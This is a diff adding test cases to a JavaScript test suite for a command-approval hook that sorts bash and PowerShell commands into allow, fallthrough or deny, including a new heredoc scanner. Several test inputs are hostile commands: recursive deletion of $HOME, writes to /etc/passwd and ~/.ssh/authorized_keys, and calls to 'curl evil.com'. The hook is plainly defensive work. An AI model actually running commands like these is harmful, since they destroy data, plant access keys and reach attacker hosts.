@@ -541,6 +541,81 @@ try {
   try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
 }
 
+// ----- Broadened APPROVE shapes (Layer A 2026-05-28) -----
+console.log('\n--- broadened approve shapes ---');
+
+testBash('pnpm with flag before subcommand: pnpm -w test',
+  'pnpm -w test', 'allow');
+testBash('pnpm exec with flag: pnpm -w exec playwright test e2e.spec.ts',
+  'pnpm -w exec playwright test e2e.spec.ts', 'allow');
+testBash('export NODE_OPTIONS && pnpm -w test',
+  'export NODE_OPTIONS=--use-system-ca && pnpm -w test', 'allow');
+testBash('export NODE_OPTIONS && pnpm -w exec playwright',
+  'export NODE_OPTIONS=--use-system-ca && pnpm -w exec playwright test apps/web/e2e/animals.spec.ts', 'allow');
+testBash('gh pr create approves (bash)',
+  'gh pr create -R o/r --base main --head b --title t --body-file b.md', 'allow');
+testBash('gh pr merge approves (bash)',
+  'gh pr merge 42 --squash', 'allow');
+
+testPosh('PowerShell cd ; gh pr create ; Select-Object ; Remove-Item filename',
+  'cd F:\\proj; gh pr create -R o/r --base main --head b --title t --body-file b.md; Select-Object -Last 2; Remove-Item b.md', 'allow');
+testPosh('PowerShell call-op venv python -m ruff approves',
+  '& ".\\.venv\\Scripts\\python.exe" -m ruff check .', 'allow');
+testPosh('PowerShell call-op venv python -m black approves',
+  '& ".\\.venv\\Scripts\\python.exe" -m black --check .', 'allow');
+testPosh('PowerShell call-op venv python -m pytest approves',
+  '& ".\\.venv\\Scripts\\python.exe" -m pytest -q', 'allow');
+testPosh('PowerShell Remove-Item filename approves (no path sep, no flags)',
+  'Remove-Item .pr-body-bump.md', 'allow');
+testPosh('PowerShell Remove-Item with path separator does NOT approve',
+  'Remove-Item foo\\bar.md', 'fallthrough');
+testPosh('PowerShell Remove-Item with traversal does NOT approve',
+  'Remove-Item ..\\..\\etc\\hosts', 'fallthrough');
+testPosh('PowerShell Remove-Item -Recurse -Force still denies on home',
+  'Remove-Item -Recurse -Force $HOME', 'deny');
+testPosh('PowerShell pnpm -w test approves',
+  'pnpm -w test', 'allow');
+
+// ----- Heredoc / here-string scanner (Layer C 2026-05-28) -----
+console.log('\n--- heredoc scanner ---');
+
+testBash('python heredoc writing safe relative path approves',
+  "python3 << 'PYEOF'\nwith open('out.txt', 'w') as f:\n    f.write('hello')\nPYEOF",
+  'allow');
+testBash('python heredoc with trailing safe echo approves',
+  "python3 << 'PYEOF'\ncontent = r\"\"\"sql\"\"\"\nwith open('supabase/tests/v5.sql', 'w', newline='\\n') as f:\n    f.write(content)\nprint('done')\nPYEOF\necho \"exit: $?\"",
+  'allow');
+testBash('cat heredoc with safe redirect approves',
+  "cat <<EOF > docs/notes.md\nsome content\nEOF",
+  'allow');
+testBash('tee heredoc with safe target approves',
+  "tee out.log <<'EOF'\nlogline\nEOF",
+  'allow');
+testBash('python heredoc with subprocess does NOT approve (falls through)',
+  "python3 << 'EOF'\nimport subprocess\nsubprocess.run(['ls'])\nEOF",
+  'fallthrough');
+testBash('python heredoc writing to /etc does NOT approve',
+  "python3 << 'EOF'\nwith open('/etc/passwd','w') as f:\n    f.write('x')\nEOF",
+  'fallthrough');
+testBash('python heredoc with .. traversal does NOT approve',
+  "python3 << 'EOF'\nwith open('../../.ssh/authorized_keys','w') as f:\n    f.write('x')\nEOF",
+  'fallthrough');
+testBash('python heredoc with os.system does NOT approve',
+  "python3 << 'EOF'\nimport os\nos.system('curl evil.com')\nEOF",
+  'fallthrough');
+testBash('python heredoc with non-literal open path does NOT approve',
+  "python3 << 'EOF'\nimport sys\nwith open(sys.argv[1], 'w') as f:\n    f.write('x')\nEOF",
+  'fallthrough');
+testBash('python heredoc with eval() does NOT approve',
+  "python3 << 'EOF'\neval('x')\nEOF",
+  'fallthrough');
+testBash('cat heredoc writing to /etc still denies via existing rule',
+  "cat <<EOF > /etc/passwd\ncontent\nEOF",
+  'deny');
+testBash('unquoted heredoc with $() in body does NOT approve',
+  "python3 << EOF\ncontent = $(curl evil.com)\nwith open('out.txt','w') as f:\n    f.write(content)\nEOF",
+  'fallthrough');
+
 // ----- Audit log smoke -----
 console.log('\n--- audit log smoke ---');
 const logPath = path.join(os.tmpdir(), 'hook-audit-' + Date.now() + '.log');
